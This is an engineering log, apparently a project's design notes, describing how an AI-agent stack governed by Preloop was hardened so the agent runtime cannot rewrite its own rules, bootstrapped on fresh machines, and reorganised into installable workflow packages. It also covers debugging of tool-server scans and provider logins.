One trap, paid for once: the guard's rules are a bind-mounted file, and compose does not restart a
container because a file under it changed. A rule edited without a reload is a rule that is not
enforced — three refusals measured as "allowed" until the reload. `scripts/up.sh` now reloads the
guard on every bring-up and warns if the configuration is refused.

## 21. Where the operator's own commands run

The same shape as §20, one door along: a governed party that can rewrite the rules it is judged by
has not been governed. Closing it needed the commands to move first, because they ran in the agent.

**What was measured before deciding.** With the decision endpoints refused, the runtime could still
change what the account enforces:

```
agent:  preloop policy apply policy/b-fsmcp.yaml
        ✓ Policy applied successfully   MCP servers 2 updated, Tools 6 updated
```

An enumerated deny list had missed it: the CLI writes through `/api/v1/policies/upload`,
`/mcp-servers`, `/tool-configurations` and `/approval-workflows`, none of which are called
"governance". So the table was inverted — writes refused by default, exceptions named — and the
same command now answers:

```
agent:  Error: failed to apply policy: API error (status 403):
        {"error":"the runtime may not change what the account enforces","by":"apiguard", …}
admin:  ✓ Policy applied successfully   MCP servers 2 updated, Tools 6 updated
```

**Where they run now.** `agentstack-admin` — the same image as the agent (it carries the Preloop CLI
and this tree's toolchain), on the admin network only, with `/work` and the Preloop home, no
workspace and no provider logins. The agent cannot reach it. Preloop answers to `api`, `console` and
`gateway` there as well as to `preloop-*`, so the toolchain needed no reconfiguration.

| command | where | why |
|---|---|---|
| `cfg.py apply`, `preloop policy apply` | **admin** | writes to Preloop |
| `principals.py create` / `rules` | **admin** | writes to Preloop |
| `cfg.py generate`, `cfg.py status` | agent | reads this tree and the provider logins, which only the agent has |
| `principals.py list` / `check` | either | reading rules, and calling MCP as a principal, are not refused |
| `approvals.py decide` | panel | §20 |

The panel's own buttons follow the same split: **생성** runs `generate` in the agent, **적용** runs
`apply` on the admin side, and `scripts/release.sh` re-applies the policy there too.

**Checked on every bring-up**, from the position the rule constrains:

```
ok    runtime may read its tool rights             200
ok    runtime may not rewrite them                 403
ok    runtime may not mint credentials             403
```

And verified the other way: a full `trading-b` run under the tightened guard completed normally —
2 model calls, 1 permission request decided by rules, evidence written, recorded — with no refusal
in the guard's log for anything the run did.

## 22. Claiming a fresh Preloop, so the stack can bring itself up

Until this existed, `scripts/up.sh` brought up every container and then stopped being able to do
anything useful if Preloop had no user: registration closes after the first one, and the first one
was made by hand, once, on this machine. A new machine — or a restore that does not carry
`preloop-oss_postgres-data` — did not come up.

**Why the stack does it and the operator does not.** A provider login is a person's: a third
party's account, on the vendor's own page, tied to that person. Preloop is ours — a container this
stack starts, claimed against localhost with the bootstrap token the install already holds. Nobody
decides anything, so nobody needs to be asked.

**The sharp edge, and what guards it.** `POST /api/v1/auth/register` is gated by the bootstrap
token only while the instance has **no** users. Afterwards `REGISTRATION_ENABLED` (true by default)
lets the same call through — and it creates a **second account** whose user is that account's owner,
silently. So `stack/bootstrap_preloop.py` refuses to run unless the caller asserts `--unclaimed`, and
`up.sh` establishes that by counting rows in Preloop's own table rather than by trying:

```
users="$(preloop_exec postgres psql -U postgres -d preloop -Atc 'select count(*) from "user"')"
[ "$users" = "0" ] && … bootstrap_preloop.py --unclaimed …
```

The bootstrap token is read from Preloop's own api container and passed on **stdin**, never as an
argument. The password is generated with a CSPRNG, written to `docker/preloop-owner.env` (mode
0600, git-ignored) and never printed: the output names the file, not its contents. The console is
the one place a person still signs in, and that is what the file is for.

Then the Preloop CLI does the rest — managed agent, durable credential, permission hook — and the
policy in `policy/` is applied, because a claimed instance still enforces nothing until it is
(§21: generating reads the provider logins in the agent, applying writes from the admin side).

**Measured against a throwaway Preloop** (its own project and volumes, no published ports, torn
down with `down -v` afterwards), from an empty home:

```
{"ok": true, "user": "owner", "secrets_file": "…/owner.env", "onboarded": true}

/tmp/boot3/.preloop/agents:  claude-code-4a43258eebfa   (hook written, token redacted here)
preloop-boot user table:     owner | owner
```

Three things it found that a plan would not have:

1. **The image ships no `~/.claude/settings.json`**, and the home is a volume, so on a fresh
   machine the CLI's onboarding fails outright: *"failed to parse Claude Code config"*. An empty
   object is enough for it to proceed, so the bootstrap writes one when the file is absent — and
   nothing else, because what goes in that file afterwards is the agent's own configuration.
2. **Preloop rejects the obvious addresses**: `owner@localhost` (no dot), `owner@stack.local` and
   `owner@stack.invalid` (reserved suffixes). `owner@agent-stack.internal` is accepted and resolves
   nowhere, which is the right shape for an account that exists so a stack can run.
3. The directory of the secrets file is created rather than assumed.

A repeat is guarded (§17): on a claimed instance the answer is `{"ok": true, "already": true}` and
nothing is written.

**What this does not do.** It does not restore anything. A claimed instance is an empty one: the
approval history, the principals and their rules, and the custodied credentials live in the Preloop
database, which is `scripts/backup.sh`'s business, not this step's. And the provider logins stay the
operator's — a fresh machine still needs a person to sign in to Claude, Codex and Grok.

## 23. A stopped run can be continued

The review's own finding was that stopping a run left nothing to continue from: Conductor wrote a
checkpoint only when a run *failed* (2 of 51 runs had one), so a stopped run was started again
rather than resumed — every model call paid for twice.

The cause was one sentence in `conductor stop --help`: it escalates *"a graceful cancel **via the
dashboard** (which lets the run checkpoint), then a platform signal, then forceful termination"*.
Our runs had no dashboard, so the first rung of that ladder was missing and the stop went straight
to a signal.

So runs now start with `--web --web-port 0`. **This is not a dashboard for anyone to look at**: it
binds the container's loopback and is not published (§14 still holds — past runs are read through
the replay container). It exists because `conductor stop`, which runs in the same container, needs
it to cancel gracefully.

**Measured, end to end:**

```
stop    Stopped workflow 'novel-a' (PID 9921, port 33619)
        checkpoints/novel-a-20260923-213638-fc5b8e17.json   ← written by the graceful cancel
        current_agent: author   failure: "Workflow stopped by user via dashboard"
resume  route → roles → stage → architect → author → author → freeze → reviews → triage
        → record_pass → done_pass        PASS, 4 model calls
```

The step list is the evidence: `author → author` is the step that was interrupted, re-entered. The
steps before it did not run again — a full run of this workflow makes five model calls, and this
one made four.

**Two things it exposed**, both of the same family as the mirror problem this repo was created to
kill — something true in the tree and not true in what runs:

1. **A resumed run read as the failure it was stopped at.** A stop and its resume share one event
   log, and the view took the first ending it saw. It now takes the last: a `workflow_completed`
   clears the earlier error, and `resumable` asks whether the *last* thing recorded was the
   workflow completing — not whether the log "ended", because a stop ends it too.
2. **Nothing in this tree built its own images.** `scripts/up.sh` only ran `up -d`, so an edit to
   `ops/server.py` or `hub/index.html` never reached the running panel and nothing said so — the
   resume route answered "no such route" from a container built two hours earlier. `up.sh` now
   runs `up -d --build`; with layers cached a bring-up costs about 25 seconds.

**What `--web` cost, found by the first suite and not by reasoning.** Conductor keeps serving the
dashboard after the workflow ends, so waiting for the process to exit waits forever: five launchers
were still asleep half an hour after their runs had finished, and a suite's third case never
started because the pool never got a worker back. The runs themselves were fine — the event log had
their outcome and MLflow had their record — which is exactly why it went unnoticed: the reader
looked at the log, not at the process.

So a run is now waited for the way it is read: `run_conductor()` watches this run's **event log**
for the workflow ending, then gives the dashboard five seconds and asks it to go (`terminate`, then
`kill`). A resume looks only past what was already in the log, because the log it continues ends
with the stop that interrupted it. The tidy-up's own signal is not reported as the run's exit —
that would call a finished run a failure; the outcome is in the log, where every reader here takes
it from.

**In the panel**: a run that stopped before it finished, and has a checkpoint, offers **재개** next
to **중지**.

**Taking the whole stack down is the same question one level up.** `scripts/down.sh` used to go
straight to `compose down`, which pulls the container out from under whatever was running: the step
in flight is lost, and there is no checkpoint to continue from. It now stops the runs first, the
way a person would, and only then the containers. Measured, with a run in flight:

```
== runs in flight: safestop01
   stopping safestop01 (graceful: it keeps its checkpoint)
== stopping
   …
checkpoints/novel-a-20260924-051144-56e8abc3.json
after scripts/up.sh:   state finished, resumable True
```

The wait for the runs to end is bounded (about a minute) and what is still running is reported
rather than waited on forever. `--now` skips the whole step for when that is what you want. Whether an interrupted run is worth continuing is the same kind of judgement as
stopping it was, so it is offered in the same place; the run resumes detached, as a start does.

## 24. Running a set of cases

§19 gave a run's trajectory and a `--suite` label, and then stopped — which left the boundary in
the wrong place. Deciding **what a case is** and **whether an answer was right** needs the domain,
and belongs to the workflow. But **starting a run per case, keeping them apart and reading back
what each one did** is execution, and execution is the platform's. Until now nothing turned a file
of cases into that set of runs; every case was started by hand.

`stack/suite.py`:

```
suite.py run  <suite> <workflow> <profile> <cases.jsonl> [--concurrency N]
suite.py read <suite> [--json]
```

`cases.jsonl` is one JSON object per line. `case` names the line; **every other key is passed to
the workflow as an input, unread** — a value this stack does not interpret is a value it cannot
distort. A line it cannot use is reported, never skipped in silence: not JSON, not an object, a
case id that is not a name, or a case id that appears twice. One run id per `(suite, case)`, so a
repeat is recognised rather than duplicated (§17).

What `read` adds to the per-run trajectories is a tally of **execution fact** — how many reached a
terminal step, how many were recorded, how the loops stood against their own bounds, what it cost,
how often a rule decided a permission request and how often a person was asked. How the runs ended
is counted too and labelled as what it is: *the workflow's own word, not a grade*. There is no
accuracy and no score in this file, and a control fails if one appears in its code. Joining these
runs to expected answers is the grader's work; the `case` each run carries is what it joins on.

**The first suite found something, which is what a set is for.** Three cases of `novel-a`
(`default`, `strict`, `strict-nofix`) all ended at `done_hold` with zero model calls:

```
shape01-strict  novel-a  done_hold  suite=shape01  case=strict
  steps            route → roles → record_hold → done_hold
  model calls      0  {}
suite shape01: 3 of 3 runs read
  reached a terminal step  3/3   recorded 3/3
  cost                     0 calls, — tokens
```

The router had said `ROUTE: codex within limits`, but the roles step could not give the chapter an
author, because Claude was not eligible: **"unknown: unparseable observed_at"**. Behind it, from
CodexBar: *"Claude OAuth token expired… run `claude login`, then retry."* The stack held, correctly
— and `scripts/up.sh` still reported `claude /route login  true`, because that check asks whether a
login file exists, not whether the token in it still works.

So the bring-up now asks the question a run would ask, through `ops_health.unknowable()`, which
runs the same three parts in the same order a run's first step does — this profile's policy, a
fresh collection of observations, the router's own evaluation:

```
FAIL  every provider's state is knowable           expected 0, got 1
      claude: unknown: unparseable observed_at
```

**Only "unknown:" counts.** At a limit, or a stale observation, is ordinary operation and not a
failure; *not being able to tell* is, because every run that needs that provider will hold while
the login check still says the login is there. The same fact is a standing risk in
`stack/ops_health.py`, so it appears in the panel where a person will see it — and signing in again
is that person's, as every provider login is.

## 25. What a second machine gets

Everything above assumed this machine. Two things were missing for any other one, and they are
different in kind.

**The host, before anything.** `scripts/install.sh --check` asks for what this stack needs by name
and changes nothing:

```
== the host
  ok    docker compose >= 2.24       5.5.1
  ok    architecture                 x86_64
  ok    disk for images              910GB free
== Preloop OSS
  ok    installed                    ~/.preloop-oss
```

Two of those are not preferences. The composition uses `env_file: required: false`, which compose
learned in **2.24** — an older one fails with a parse error that does not name the feature it did
not know. And `docker/agent.Dockerfile` installs a **linux-x64** Node and an **x86_64** CodexBar;
every image this stack pulls is multi-arch (checked: preloop, console, pgvector, nats, nginx,
python, docker-cli), so arm64 is two parameterized lines away and has neither been done nor tried.
Without the check, an arm64 machine finds that out five minutes into a build, in a tar error.

Without `--check` the installer runs **Preloop's own installer** if `~/.preloop-oss` is not there,
then hands over to `scripts/up.sh`. It signs in to no provider: those accounts belong to a person.

**The governance, which was the real gap.** `stack/workflows/novel-a.yaml` names the identities its
steps run as — `story=codex:novel-reviewer` — but nothing in this tree said what those identities
*were*. They existed only in Preloop's database, put there by hand. A second machine would have run
the same workflow with no principals at all: the reviewer that may not touch the draft (§10) would
have been a sentence in a document.

So they are declared, in `config/principals.yaml`, in Preloop's own rule shape, and
`principals.py apply` makes Preloop match the file — creating what is missing, replacing rules that
differ, leaving alone what agrees. `scripts/up.sh` runs it on every bring-up, on the admin side,
because changing tool rights is a write the guard refuses from the governed network (§21).

Measured, by changing the declaration and watching Preloop follow it:

```
changed rule, applied      {"changes": [{"principal": "novel-reviewer", "did": "rules set"}]}
preloop now says           a reviewer writes its own review (v2)
restored, applied          {"changes": [{"principal": "novel-reviewer", "did": "rules set"}]}
applied again              {"changes": []}
and preloop says           a reviewer writes its own review
```

One defect the measurement found: the first version decided whether a principal needed a credential
by looking at **its own process environment**. The credentials are mounted into the agent and
`apply` runs in the admin container, so it saw none, tried to mint a second one for every principal
and failed on the duplicate name. It now asks Preloop whether a live credential exists *and* the
env file whether a line for it exists — either missing and the pair is unusable — and it picks a
name Preloop will accept. A control pins that the environment is not consulted.

### The cold start, run

A second instance was brought up from a **clone** — its own name (`agst2`), ports, volumes, Preloop
install (`~/.preloop-cold`) and Preloop project, declared in its own `config/instance.env`. One
command, `scripts/install.sh`, and this is what came out:

```
{"ok": true, "user": "owner", "secrets_file": "…/preloop-owner.env", "onboarded": true}
== applying this stack's policy to the new instance
  "preloop-policy:policy/b-fsmcp.yaml": "applied"
== principals: novel-author created, credential minted; novel-reviewer created, rules set,
               credential minted
== services
  ok    Preloop MCP (auth required) 401      ok    fsmcp tools exposed via Preloop  yes
  ok    runtime may not decide approvals 403 ok    runtime may not rewrite them     403
== logins (routing layer)
  FAIL  claude /route login   expected true, got false      (and codex, grok, the observer)
```

Everything this stack owns came up on a machine that had none of it, including the governance: the
reviewer on the new instance is denied the draft by the same rule, because the rule is a file.
**The only failures are the provider logins**, which are a person's — and the stack says so instead
of pretending.

Four things it found, none of which could have been found by reasoning:

1. **`install.sh` did not read `config/instance.env`.** It checked — and would have installed over
   — the *live* instance's Preloop directory while running in the second instance's tree.
2. **The install directory was not passed to Preloop's installer.** `--preloop-dir` was honoured by
   the check and ignored by the install, whose own default is `~/.preloop-oss`. Both are now read
   and passed, with `PRELOOP_SKIP_ADMIN=1` because claiming the instance is this stack's own step.
3. **A failed `chmod` lost a credential.** Writing `docker/principals.env` on a bind mount from a
   Windows host answers "Operation not permitted" to the mode change, and the exception came after
   the token was written and before it was reported. The mode is now best-effort: the file's
   protection is the host's, and losing a credential Preloop has already issued is the worse
   outcome.
4. **A minted credential did not reach the agent.** It is a line in an `env_file`, read when the
   container starts, so the first bring-up ended with principals whose steps could present nothing.
   Compose does recreate the agent when that file's contents change, and `up.sh` now also asks for
   it explicitly when `apply` reports a mint.

**One constraint, since removed.** The cold start above was run with the live instance stopped,
because Preloop's own compose publishes 8000 / 8001 / 3000 with those numbers written in and its
installer starts the stack before anything of ours applies. That made a second instance
uninstallable on a machine running a first — which is exactly the situation on a host that already
runs another Preloop for something else.

**The first fix was wrong, and an arm64 Mac found it.** `install.sh` wrote a
`docker-compose.override.yaml` into the Preloop install directory, on the belief that compose reads
it from the project directory. It does — **only when compose resolves the files itself**. Every call
here names them with `-f`: their installer's, `up.sh`'s, `down.sh`'s. So the override was never read
once, and the check that "proved" it passed because the test had passed the file with `-f` and
because the live instance's ports were the defaults anyway. On a host already running another
Preloop, the api container simply could not bind 8000.

Two corrections, both measured on the live install directory:

1. **Preloop's own file is made instance-aware, once.** `install.sh` rewrites its three published
   ports to `${PRELOOP_API_PORT:-8000}` and friends — the same numbers by default, this instance's
   when `config/instance.env` says otherwise. It keeps a `.before-agent-stack` copy, is idempotent,
   and runs on every install because their installer re-downloads that file.
2. **`preloop.agentstack.yaml` no longer publishes anything.** It did, and with the base file also
   publishing, the two lists **merged instead of replacing**: the same port bound twice, and the
   second bind failed. One owner for a published port, and it is Preloop's own file.

```
PRELOOP_API_PORT=8020 …  →  published "8020", "8021", "3020"   (three lines, one per service)
defaults              →  the live instance comes back on 8000 / 8001 / 3000, all checks passing
```

Their installer still ends by starting Preloop on whatever the file says at that moment, which on a
busy host cannot bind. That is no longer treated as a failed install: the files are there, the
ports are this instance's from then on, and `up.sh` starts it. Nothing of the other instance is
touched either way.

The rule that remains is the one that matters: a second instance gets its own Preloop **directory,
project and database**. Pointing it at a running instance's Preloop would apply this stack's policy
and principals to that account.

### The same cold start, on Linux

`.github/workflows/cold-start-linux.yml` runs exactly what a second machine runs — clone,
`install.sh --check`, `install.sh` — on a GitHub runner that has none of this, and judges the
result rather than the exit code. A runner has no provider logins and never will, so six checks
are allowed to fail (the three `/route` logins, the observer's, and the two quota ones) and
**nothing else may**; and six things must be present, from `"onboarded": true` to
`runtime may not rewrite them 403`.

It passed on the fourth attempt. The first three did not, and each one was a defect this machine
could not have shown:

| | what Linux found | why Windows never did |
|---|---|---|
| 1 | `up.sh` waited **8 seconds** for Preloop, then claimed it — "Connection refused" | a machine that has run Preloop before starts it in seconds; a fresh install runs migrations first. It now waits for the API to answer, up to 180s |
| 2 | the container could not write `docker/preloop-owner.env` — "Permission denied" | a Windows bind mount ignores ownership; a Linux one is owned by whoever cloned the tree |
| 3 | …and that failure landed **after** registration, leaving an account whose password nobody would ever know | it never failed there, so the order never mattered. The password is now written before the account is created and removed if creation fails |
| 4 | `cfg.py generate` could not write `config/generated` → no MCP servers on the account → no tool served through Preloop | same ownership difference, one directory further in |

The fix for 2 and 3 is a rule worth stating: **a container does not write secrets into this tree.**
It writes them inside itself and `scripts/up.sh` puts them in place as the host user, at 0600, and
they never pass through a terminal or a log. For 4, the two trees the containers genuinely write to
(`config/generated`, `evidence`) are made writable at bring-up; neither holds a credential.

What the passing run proves is not "it built": it is that a machine with none of this ends up
**governed** — the account claimed, the policy applied, `novel-author` and `novel-reviewer` created
from `config/principals.yaml` with the reviewer's deny rule, and the runtime refused the approval
decision, the rights rewrite and the credential mint. Only the logins were missing, and those are a
person's.

**arm64 is now a parameter, not a rewrite.** The two downloads that tied the agent image to
x86_64 — Node and CodexBar — pick their build from `TARGETARCH` (both publish `arm64` /
`musl-aarch64`), and `install.sh` reports an arm64 host as *parameterized and never built here*
rather than refusing it. The amd64 image was rebuilt and all checks passed after the change; the
arm64 one has not been built. Still not run anywhere: macOS, and any arm64 host.

## 26. A tool server Preloop has registered and not scanned

On the arm64 machine's clean install, everything came up and the runtime could see **four** tools —
Preloop's own — and none of the file tools it is supposed to reach through it. The account had the
policy (`already applied`), the tool server was up and listening, and every later bring-up agreed
that nothing needed doing.

**The cause is one line of Preloop's behaviour plus one of ours.** Preloop does not expose a tool
server's tools until it has **scanned** it; `cfg.py apply` scans as its second stage and then
records `scan: done`. A scan that runs before that server is listening registers a server with
nothing on it — and the record says the work is finished, so nothing scans again. On a machine that
has run before, everything is warm and this never happens.

**What it is not.** The first diagnosis was that the probe assumes a principal named `claude` which
that instance did not declare. `stack/mcp_list.py claude` takes the **runtime's own** MCP credential
out of `~/.claude.json`; the argument is which agent's config to read, not a principal. No instance
here has a principal called `claude`, and the check passes on the ones where the scan landed —
verified by asking this instance for both: its principals are `novel-author` and `novel-reviewer`,
and the runtime sees twenty tools including `write_file`.

**The way out, and who takes it.** `cfg.py rescan` scans every server the active policy names,
whatever the recorded state says. `scripts/up.sh` asks the question the way the check does — *can
the runtime see the tools* — and rescans before the checks when it cannot:

```
== the tool servers are registered but not exposed — scanning them again
   {"ok": true, "policy": "policy/b-fsmcp.yaml", "scanned": ["…-toolsvc", "…-fsmcp"]}
```

Asking Preloop instead would not have worked: `GET /mcp-servers/{id}/tools` answers **0 tools** for
both servers on this instance, where the runtime sees twenty. What the runtime can see is the only
answer that means anything.

**And a difference that made the machines incomparable.** That install took Preloop **0.16.0**,
because their installer takes whatever is current. Everything measured here — the governance
endpoints, the scan, what a credential resolves to — was measured against **0.15.0**.
`scripts/install.sh` now pins `PRELOOP_VERSION=0.15.0` by default and says so on the line where it
installs; an operator who wants a newer one passes it deliberately and knows they are ahead of the
measurements.

### The layer under it: a record that outranked the account

The rescan above fixed the case it was built for and not the one the other machine actually had.
Running it there answered `not_registered: [toolsvc, fsmcp]` — and `GET /api/v1/mcp-servers`
answered **`[]`**. The account had no MCP servers at all, while our state file said
`scan: done`, so `cfg.py apply` skipped the CLI on every bring-up and a rescan had nothing to scan.
A direct `preloop policy apply` created both servers in one go, which is the proof that the CLI was
never the problem: **our own record was being treated as evidence about someone else's system.**

Reproduced here on 0.15.0 by deleting both servers and leaving the record alone — the runtime fell
from twenty tools to Preloop's own four, and every apply still said `already applied`. The fix:

```python
if (not force and … and active.get("scan") == "done" and policy_servers_present(env, pol)):
    results[key] = "already applied"
```

`policy_servers_present` asks Preloop whether the account has every server the policy declares. An
unreachable Preloop answers *True*: a question that could not be asked must not cause an apply to
repeat any more than to skip. `--force` ignores the record entirely.

And the heal in `scripts/up.sh` now **applies before it scans**, because a rescan cannot create a
server. Measured, from the same reproduction:

```
== the runtime cannot see the tool servers — applying the policy again, then scanning
   "preloop-policy:policy/b-fsmcp.yaml": "applied"
   {"ok": true, "scanned": ["agentstack-toolsvc", "agentstack-fsmcp"], "not_registered": []}
  ok    fsmcp tools exposed via Preloop              yes
```

Three diagnoses were offered for this symptom before the right one: a principal that does not
exist, a profile mismatch, a scan that ran too early. The first two were disproved by asking this
instance the same questions; the third was real but was the layer above. What settled it was the
account's own answer — `[]` — rather than any reasoning about what should have been there.

The version difference is still worth what it cost: that machine was running **0.16.0**, where
`preloop policy list` answers 404, and everything here is measured against **0.15.0**.
`scripts/install.sh` pins it.

## 27. A workflow that arrives as a directory

Until now a workflow was three things at once: a file under `stack/workflows/`, steps and prompts
scattered through `stack/`, and **its name written into a list inside `run_workflow.py` and a second
list inside `ops/server.py`**. So a workflow could not be given to anyone — installing one meant
editing the platform, which is the one thing CONTRACT.md says a workflow must never have to do. The
question that exposed it was practical: *can a workflow be a package, so another machine installs
the stack, drops the directory in, and runs it?* It could not.

A package is a directory under `packages/`:

```
packages/<name>/
  manifest.yaml     name, version, entry, and what it needs of the stack
  workflow.yaml     the graph; its steps by absolute path under the package root
  steps/ prompts/ fixtures/ cases/
  principals.yaml   the identities its steps run as, in the shape of config/principals.yaml
```

`stack/packages.py` answers three questions and no others — what is installed, where is its entry
point, and what does it declare that the stack must set up. It does not interpret the graph.

**What changed in the platform, once:**

| | |
|---|---|
| `run_workflow.py` | `BUILT_IN` ∪ the loader's packages; `run_workflow.py workflows` is the one answer |
| `ops/server.py` | asks the runner instead of keeping a second list — a package is startable from the panel the moment it is there |
| `principals.py apply` | merges each package's `principals.yaml`, so installing a workflow gives its identities rights of their own |

**Measured**, with `packages/hello-lane` — one deterministic step, no model call, nothing the
platform knows:

```
run_workflow.py workflows   {"hello-lane": "packages/hello-lane/workflow.yaml", "auto": …}
start pkgtest01 hello-lane  steps [write, done]  → finished at done
output                      {"path": "/ws/50113cc1/hello.txt", "sha256": "6d16868e…", "chars": 20}
up.sh                       principals: hello-writer created, rules set, credential minted
panel /api/workflows        hello-lane is startable
```

A package that is wrong is refused with the reason, never half-loaded: no manifest, a manifest
naming a different package, a missing entry, an entry pointing outside the package. Two packages
that declare the same principal **differently** are a reported conflict rather than a silent merge
— two workflows quietly sharing an identity is how rights nobody meant get discovered later.

### The ported trading workflow, rearranged

The paper-trading harness's arch cycle had already been ported onto this stack, on the branch
`port/trading-harness`, in the old shape: its workflow under `stack/workflows/`, its steps beside the
platform's in `stack/steps/`, its prompts and fixtures in `stack/prompts/` and `stack/fixtures/`. It is
now `packages/trading-port/`, and the branch stays as the record of the port itself.

```
p281/workflows/trading-port.yaml          → packages/trading-port/workflow.yaml
stack/steps/{arch_port,packet_bridge}.py   → packages/trading-port/steps/
stack/steps/vendor/                        → packages/trading-port/steps/vendor/
p281/prompts/port-*.md                    → packages/trading-port/prompts/
p281/fixtures/trading/*.json              → packages/trading-port/fixtures/
p281/port_controls.py                     → packages/trading-port/controls.py
```

Measured after the move, without any model call: the loader lists it, the runner and the panel
offer it, its deterministic bridge runs from the committed fixture
(`packet_sha256 26a3a92b…, 8 symbols`), its planner produces four lanes and **seven prompts that all
resolve inside the package**, and its own controls pass 17/17 from their new home.

Two things the move exposed:

1. **A package's steps could not import the step library.** They sit under `packages/<name>/steps/`
   and still need `settings` and the platform steps they call — `ModuleNotFoundError` the moment a
   workflow is installed rather than copied into `stack/`. The agent now carries
   `PYTHONPATH=/work/stack:/work/stack/steps`: *the step library is importable from wherever a step
   lives* is a capability, not something each package should solve.
2. **One dependency is not a capability.** `trade_stage.py` belongs to the built-in `trading-b`
   workflow, and this package reuses its `validate` so every lane is checked the same way. So the
   package is not self-contained: installing it on another machine also needs that built-in present.
   It is named in the manifest (`requires.platform_steps`) and in the package's README rather than
   left to be discovered — and it is the first thing a second package will force a decision about:
   vendor it, or promote it.

**What a package may not do yet**, and is honest to say: it cannot add to the account's tool policy
(`policy/` is still the stack's), it cannot ship its own controls into `trial_controls.py`, and its
steps address themselves by absolute path (`/work/packages/<name>/steps/…`) rather than a variable.
None of those stop a workflow from being installed and run; all three are worth doing when a second
package asks for them.

## 28. A tool that is listed and cannot be called

The ported trading package was run in pilot mode as its first end-to-end proof. It reached its
terminal step, and four of its five lanes produced nothing:

```
E: FAILED at E1     G: FAILED at G1     F: FAILED at F1     H: FAILED at H1
report: B VALID, E/G/F/H MISSING — "planned but produced nothing"
```

The evidence said why, and it was not the package:

```
preloop__write_file {"path": "/ws/af95bad4/lane_E.json", …}
  → Error: MCP server c3148d0b-4548-44a6-b817-f5c0ccfad473 not found
```

That id is the tool server **as it was before §26's reproduction**, where both MCP servers were
deleted and the policy recreated them — with new ids. Preloop resolves a tool to its server from a
cache in its api process, and that cache still held the old id. Everything that *lists* kept
working: `tools/list` returned twenty tools, `mcp_list.py` printed them, and `up.sh` reported
`fsmcp tools exposed via Preloop  yes`. Every *call* failed.

Neither `cfg.py apply --force` nor `cfg.py rescan` cleared it. **Restarting `preloop-api` did**,
immediately and completely.

Two changes, because one of them is the lesson:

1. **The check now calls a tool instead of listing one.** `mcp_list.py claude --probe` calls
   `list_allowed_directories` — a read with no side effect — and the bring-up asks *"do the tools
   work through Preloop"*, not *"are they listed"*. A check that passes while nothing works is
   worse than no check.
2. **The heal escalates only on that evidence.** If the probe fails, the policy is applied and the
   servers scanned; if the probe still fails, and only then, Preloop's api container is restarted
   and the probe repeated.

With the call path working, the same package ran again and finished as a workflow should:

```
tport02  trading-port  done_cycle     7 model calls {claude 3, codex 3, grok 1}
         8 permission asks, all decided by rules, none refused, 295k tokens
  lane_B  3 targets  gross 0.150  0 calls      lane_E  3 targets  gross 0.120  1 call
  lane_G  5 targets  gross 0.200  1 call       lane_H  3 targets  gross 0.110  2 calls
  lane_F  0 targets — INVALID, "no targets"    (3 calls: analyst → risk → PM)
```

Lane F came back invalid, and that is the boundary doing its job: the desk lane produced no
targets, the stack validated every lane identically and reported it. Whether an empty desk is a
reasonable answer is the workflow's question, not this stack's.

## 29. Two login lineages, and only one of them has a screen

A fresh install on another machine was signed in through the panel — all three providers 연결됨 —
and codex was still refused:

```
codex   account_mismatch: observed=None executing='email:4d34b3335abfc261'
```

Read as written, that says two different accounts. There was only ever one: **nothing had observed
it**, because the quota observer's own codex login had not been done. The router requires that the
account observed is the account that will execute, and an absent observation failed that test
through the branch meant for a genuine mismatch.

Two defects, both this stack's:

1. **Absent was reported as mismatched.** `router.evaluate` now separates them — an observation
   whose account is missing answers *"unknown: nothing has observed this account yet … the quota
   observer has no login for it"*, which is also what makes the bring-up's *every provider's state
   is knowable* catch it. The same lesson as §24: at a limit is ordinary, **not being able to tell
   is not**, and the two must not share a sentence.
2. **The remedy named the wrong hand.** The standing risk said "sign in again for this provider",
   meaning the routing login, when the login that was missing lives in another container and
   another account lineage. `ops_health.fix_for` now answers per case, with the command.

**Why there are two lineages at all**, since it surprises everyone once: the routing logins under
`/route` are what execute, and the observer has its own login so that reading quota does not share
a credential with spending it. Claude and Grok are usually observed through the same credential
that executes, so they survive an unconfigured observer; codex is read through it, so codex is the
one that shows.

**And then the question that removed the problem rather than documenting it:** *does codex have to
be signed in twice, for ever?* It did not. Grok is read by running CodexBar **here**, with the
routing login (`GROK_HOME=/route/grok`); nobody had tried the same for codex. Measured:

```
CODEX_HOME=/route/codex codexbar usage --provider codex --json
  identity.accountEmail → email:4d34b3335abfc261
  /route/codex/auth.json id_token email → email:4d34b3335abfc261     (the same account)
```

So `collect_obs.py` now offers a third candidate for codex — the reading taken with the credential
that executes, basis `same-credential`, exactly Grok's trust model — and it is the one the router
picks:

```
picked  codexbar-route:oauth   same-credential   observed = executing = email:4d34b…
others  rollout:… (the routing login's own session), codexbar:oauth (the observer)
```

**A fresh install now needs one login per provider, the routing one.** The observer's login remains
a second source and the thing that keeps an idle provider's reading fresh; it is no longer what
stands between a signed-in codex and a usable one.

The panel gap is narrower but real: the observer's login still exists only as a command
(`docker exec -it $STACK-quota codex login`). It is no longer on the path of a first install, which
is what made it worth fixing rather than only writing down.

## 30. Every workflow is a package, including the ones this stack was built with

The panel's 워크플로 실행 tab offered two workflows out of seven, and no package at all. The reason
was the same one §27 found in the runner and the ops API, one place further out: the screen kept
its **own** list — `<option>` elements written by hand, and an `INPUTS` map beside them.

So the screen asks now. `run_workflow.py workflows --detail` reads each workflow file and returns
what it says about itself — its description and the inputs it declares, minus `profile`, which the
panel chooses once for any of them — and the tab builds the select and the input fields from that.
A workflow that exists is offered; one that does not, is not.

Then the deeper half of the same question: **why were five workflows still built in?** They were
the ones this stack was written with, and they sat in `stack/` where a package's contents may not
reach. They are now packages too:

```
packages/auto/        auto, route        steps/check.py, steps/execute.py
packages/research-r/  research-r         steps/r_stage.py, prompts/r-*.md
packages/novel/       novel-a            steps/novel_stage.py, prompts/novel-*.md, fixtures/
packages/trading/     trading-b,         steps/trade_stage.py, steps/arch_port.py,
                      trading-shapes,    steps/packet_bridge.py, steps/vendor/,
                      trading-port       prompts/{trade,shape,port}-*.md, fixtures/
packages/hello-lane/  hello-lane         the example
```

`BUILT_IN` is now empty, and `stack/steps/` holds only what every workflow may call: `route.py`,
`roles.py`, `agent_task.py`, `tasks.py`, `task_chain.py`, `fanout.py`, `record.py`. That list is
the platform's surface, and it is now visible as one.

**A package may carry more than one workflow**, which the trading ones forced rather than suggested:
`trading-b`, `trading-shapes` and `trading-port` share one deterministic step (`trade_stage.py`).
Three packages would have meant three copies of it or a dependency between packages — the very
thing §27 recorded as the port's one unresolved edge. One package with three workflows resolves it,
and the manifest says so (`workflows: {name: file}`).

**Measured after the move**, on this machine:

```
packages.py            auto(auto, route) · hello-lane · novel(novel-a) · research-r · trading(3)
